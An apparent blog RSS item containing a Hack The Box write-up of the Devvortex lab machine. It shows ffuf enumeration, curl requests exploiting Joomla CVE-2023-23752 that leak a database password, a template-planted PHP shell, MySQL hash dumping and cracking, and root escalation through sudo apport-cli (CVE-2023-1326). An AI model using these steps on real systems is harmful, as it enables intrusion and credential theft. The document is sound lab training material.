]]></description></item><item><title>HTB Machine Devvortex</title><link>https://hshakilst.github.io/posts/htb-machines/devvortex/</link><pubDate>Thu, 16 May 2024 16:41:36 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/devvortex/</guid><description><![CDATA[<h1 id="devvortex---htbhttpswwwhacktheboxcommachinesdevvortex">Devvortex - <a href="https://www.hackthebox.com/machines/devvortex">HTB</a></h1>
<p><img src="images/banner.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap-services">Nmap Services</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
</tr>
</thead>
<tbody>
<tr>
<td>80</td>
<td>http (nginx/1.18.0)</td>
</tr>
<tr>
<td>22</td>
<td>ssh ()</td>
</tr>
</tbody>
</table>
<h3 id="subdomains-vhost">Subdomains (VHost)</h3>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fs 154 

    /'___\  /'___\           /'___\       
   /\ \__/ /\ \__/  __  __  /\ \__/       
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
     \ \_\   \ \_\  \ \____/  \ \_\       
      \/_/    \/_/   \/___/    \/_/       

   v2.1.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://devvortex.htb
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Header           : Host: FUZZ.devvortex.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 135ms]
:: Progress: [26584/26584] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:56] :: Errors: 1 ::
</code></pre>
<ul>
<li><strong>dev.devvortex.htb</strong></li>
</ul>
<h3 id="http-enumeration---devdevvortexhtb">HTTP Enumeration - dev.devvortex.htb</h3>
<ul>
<li>
<p><strong>ffuf</strong></p>
<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -u http://dev.devvortex.htb/FUZZ                       

  /'___\  /'___\           /'___\       
 /\ \__/ /\ \__/  __  __  /\ \__/       
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
   \ \_\   \ \_\  \ \____/  \ \_\       
    \/_/    \/_/   \/___/    \/_/       

 v2.1.0-dev
________________________________________________
:: Method           : GET
:: URL              : http://dev.devvortex.htb/FUZZ
:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 423ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 106ms]
                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1176ms]
cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
:: Progress: [26584/26584] :: Job [1/1] :: 33 req/sec :: Duration: [0:12:53] :: Errors: 2 ::
</code></pre>
</li>
<li>
<p><strong>robots.txt</strong> - <a href="http://dev.devvortex.htb/robots.txt">http://dev.devvortex.htb/robots.txt</a></p>
<pre><code>&lt;---snipped---&gt;
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
</code></pre>
</li>
<li>
<p><strong>README.txt</strong></p>
<pre><code>Joomla! CMS™

1- Overview
	* This is a Joomla! 4.x installation/upgrade package.
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev

  &lt;---snipped---&gt;
</code></pre>
</li>
<li>
<p><strong>Services Running</strong></p>
<ul>
<li>Joomla CMS 4.2</li>
</ul>
</li>
</ul>
<h3 id="vulnerability-assessment---joomla-cms-42">Vulnerability Assessment - Joomla CMS 4.2</h3>
<ul>
<li>
<p><strong>Vulnerability</strong>: Joomla CMS 4.2 is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check in <code>Core</code> webservice endpoints. The affected versions are 4.0.0-4.2.7 in range. Due to flaws in Joomla’s access control to Web service endpoints, unauthenticated attackers access the RestAPI interface to obtain Joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. For more on the vulnerability :</p>
<ul>
<li><a href="https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/">NS Focus Global</a></li>
<li><a href="https://vulncheck.com/blog/joomla-for-rce">Vuln Check</a></li>
</ul>
</li>
<li>
<p><strong>PoC</strong>: A publicly available exploit is published on <a href="https://www.exploit-db.com/exploits/51334">ExploitDB</a>. We can use this <code>{root_url}/api/index.php/v1/users?public=true</code> REST endpoint to obtain user information , and this <code>{root_url}/api/index.php/v1/config/application?public=true</code> endpoint for application configuration.</p>
</li>
</ul>
<h2 id="joomla-cms-42">Joomla CMS 4.2</h2>
<h3 id="exploiting-cve-2023-23752">Exploiting CVE-2023-23752</h3>
<ul>
<li>
<p><strong>User Information</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/v1/users?public=true

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/v1\/users?public=true&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;649&quot;,&quot;attributes&quot;:{&quot;id&quot;:649,&quot;name&quot;:&quot;lewis&quot;,&quot;username&quot;:&quot;lewis&quot;,&quot;email&quot;:&quot;lewis@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:1,&quot;registerDate&quot;:&quot;2023-09-25 16:44:24&quot;,&quot;lastvisitDate&quot;:&quot;2024-04-26 10:37:12&quot;,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Super Users&quot;}},{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;650&quot;,&quot;attributes&quot;:{&quot;id&quot;:650,&quot;name&quot;:&quot;logan paul&quot;,&quot;username&quot;:&quot;logan&quot;,&quot;email&quot;:&quot;logan@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:0,&quot;registerDate&quot;:&quot;2023-09-26 19:15:42&quot;,&quot;lastvisitDate&quot;:null,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Registered&quot;}}],&quot;meta&quot;:{&quot;total-pages&quot;:1}}      
</code></pre>
</li>
<li>
<p><strong>Application Config</strong>:</p>
<pre><code>$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 

{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&quot;,&quot;next&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&quot;,&quot;last&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_message&quot;:&quot;This site is down for maintenance.&lt;br&gt;Please check back again soon.&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;display_offline_message&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_image&quot;:&quot;&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;sitename&quot;:&quot;Development&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;editor&quot;:&quot;tinymce&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;captcha&quot;:&quot;0&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;list_limit&quot;:20,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;access&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang_const&quot;:true,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbtype&quot;:&quot;mysqli&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;host&quot;:&quot;localhost&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;user&quot;:&quot;lewis&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;password&quot;:&quot;P4ntherg0t1n5r3c0n##&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;db&quot;:&quot;joomla&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbprefix&quot;:&quot;sd4fg_&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbencryption&quot;:0,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbsslverifyservercert&quot;:false,&quot;id&quot;:224}}],&quot;meta&quot;:{&quot;total-pages&quot;:4}}
</code></pre>
<p>We can see from the <code>meta</code> that it&rsquo;s only page 1 out of 4. We should gather all the data from this api using the <code>next</code> link and save it to a file.</p>
</li>
</ul>
<h3 id="users-and-credentials">Users and Credentials</h3>
<ul>
<li>
<p><strong>Users</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;id&quot;: 649,
    &quot;name&quot;: &quot;lewis&quot;,
    &quot;username&quot;: &quot;lewis&quot;,
    &quot;email&quot;: &quot;lewis@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 1,
    &quot;registerDate&quot;: &quot;2023-09-25 16:44:24&quot;,
    &quot;lastvisitDate&quot;: &quot;2024-04-26 10:37:12&quot;,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Super Users&quot;
}
</code></pre>
</li>
<li>
<p>logan:</p>
<pre><code>{
    &quot;id&quot;: 650,
    &quot;name&quot;: &quot;logan paul&quot;,
    &quot;username&quot;: &quot;logan&quot;,
    &quot;email&quot;: &quot;logan@devvortex.htb&quot;,
    &quot;block&quot;: 0,
    &quot;sendEmail&quot;: 0,
    &quot;registerDate&quot;: &quot;2023-09-26 19:15:42&quot;,
    &quot;lastvisitDate&quot;: null,
    &quot;lastResetTime&quot;: null,
    &quot;resetCount&quot;: 0,
    &quot;group_count&quot;: 1,
    &quot;group_names&quot;: &quot;Registered&quot;
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Credentials</strong>:</p>
<ul>
<li>
<p>lewis:</p>
<pre><code>{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;user&quot;: &quot;lewis&quot;,
        &quot;id&quot;: 224
    }
},
{
    &quot;type&quot;: &quot;application&quot;,
    &quot;id&quot;: &quot;224&quot;,
    &quot;attributes&quot;: {
        &quot;password&quot;: &quot;P4ntherg0t1n5r3c0n##&quot;,
        &quot;id&quot;: 224
    }
},
</code></pre>
<p>We can try this creds to log into the admin dashboard of Joomla at <code>http://dev.devvortex.htb/administrator</code>.</p>
</li>
</ul>
</li>
</ul>
<h3 id="admin-dashboard-enumeration">Admin Dashboard Enumeration</h3>
<ul>
<li>PHP: 7.4.3 which is obsolete and no longer receives official security updates.</li>
<li>MySQL: 8.0.35-0ubuntu0.20.04.1</li>
<li>Server: Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64</li>
<li>Disable PHP Functions:
<ul>
<li>pcntl_alarm</li>
<li>pcntl_fork</li>
<li>pcntl_waitpid</li>
<li>pcntl_wait</li>
<li>pcntl_wifexited</li>
<li>pcntl_wifstopped</li>
<li>pcntl_wifsignaled</li>
<li>pcntl_wifcontinued</li>
<li>pcntl_wexitstatus</li>
<li>pcntl_wtermsig</li>
<li>pcntl_wstopsig</li>
<li>pcntl_signal</li>
<li>pcntl_signal_get_handler</li>
<li>pcntl_signal_dispatch</li>
<li>pcntl_get_last_error</li>
<li>pcntl_strerror</li>
<li>pcntl_sigprocmask</li>
<li>pcntl_sigwaitinfo</li>
<li>pcntl_sigtimedwait</li>
<li>pcntl_exec</li>
<li>pcntl_getpriority</li>
<li>pcntl_setpriority</li>
<li>pcntl_async_signals</li>
<li>pcntl_unshare</li>
</ul>
</li>
<li>Phar: PHP Archive support is enabled. Can be used to bypass upload restriction for a shell.</li>
</ul>
<h3 id="getting-foothold">Getting Foothold</h3>
<p>In the <code>System</code> menu Joomla offeres option to customize a template. I customized a template by modifying a existing php file. By inserting a shellcode I was successful getting a shell on the box as <code>www-data</code> user.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-stabilization">Shell Stabilization</h3>
<p>The shell was not stable at all. I couldn&rsquo;t see any interective output because I was missing an actual shell.</p>
<p><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></p>
<p>I was <code>www-data</code> and it&rsquo;s shell was assigned nologin. I did the following to make the shell stable.</p>
<pre><code>script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
</code></pre>
<p>Then I had a good enough shell to work with.</p>
<h3 id="user-enumeration">User Enumeration</h3>
<p>After inspecting the <code>/etc/passwd</code> file I was sure that I had to escalate my privileges and take over <code>logan</code>  account. I could list the account&rsquo;s home directory and found the user flag but didn&rsquo;t have permission to read it.</p>
<h3 id="service-enumeration">Service Enumeration</h3>
<p>After inspecting for users I tried to access the MySQL database to find any credentials that can help me pivot to <code>logan</code>. So I logged in to the database service using the <code>lewis:P4ntherg0t1n5r3c0n##</code> and it worked.</p>
<h3 id="mysql-enumeration">MySQL Enumeration</h3>
<ul>
<li>
<p><strong>Databses</strong>:</p>
<pre><code>show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
</code></pre>
</li>
<li>
<p><strong>Tables</strong>:</p>
<pre><code>+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
</code></pre>
</li>
<li>
<p>Users:</p>
<pre><code> +----------+--------------------------------------------------------------+
 | username | password                                                     |
 +----------+--------------------------------------------------------------+
 | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
 | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
 +----------+--------------------------------------------------------------+
</code></pre>
</li>
</ul>
<h3 id="cracking-the-logan-hash">Cracking the <code>logan</code> Hash</h3>
<p>Using john the ripper I was able to crack the hash for logan.</p>
<p><code>logan:tequieromucho</code></p>
<p>Let&rsquo;s try this credential to log on. I could successfully log in using <code>ssh</code>.</p>
<h3 id="root-privilege-escalation">Root Privilege Escalation</h3>
<p>After login into the <code>logan</code> account. I ran the command <code>sudo -l</code> with the above password. And I found following sudoers privileges for the account.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Matching Defaults entries for logan on devvortex:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
</span></span><span style="display:flex;"><span>    (ALL : ALL) /usr/bin/apport-cli
</span></span></code></pre></div><p>So <code>logan</code> can run <code>/usr/bin/apport-cli</code> with <code>sudo</code>. After, searching for apport-cli&rsquo;s know vulnerability I found a Privilege Escalation Vulnerability for apport-cli &lt;= v2.26.0 dubbed <code>CVE-2023-1326</code>. The machine&rsquo;s <code>apport-cli</code> version is <code>2.20.11</code>. So it can be exploited if certain conditions are met. <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">For more on the PoC</a>.</p>
<ol>
<li>
<p>System should specially configured to allow unprivileged users to run sudo apport-cli.</p>
</li>
<li>
<p><code>less</code> is configured as the pager.</p>
</li>
<li>
<p>The terminal size can be set.</p>
</li>
</ol>
<p>Unfortunately all of the conditions were present in the box and we successfully gained <code>root</code> privilege following the steps described in PoC. Finally, acquired the root flag.</p>
]]></description></item></channel></rss>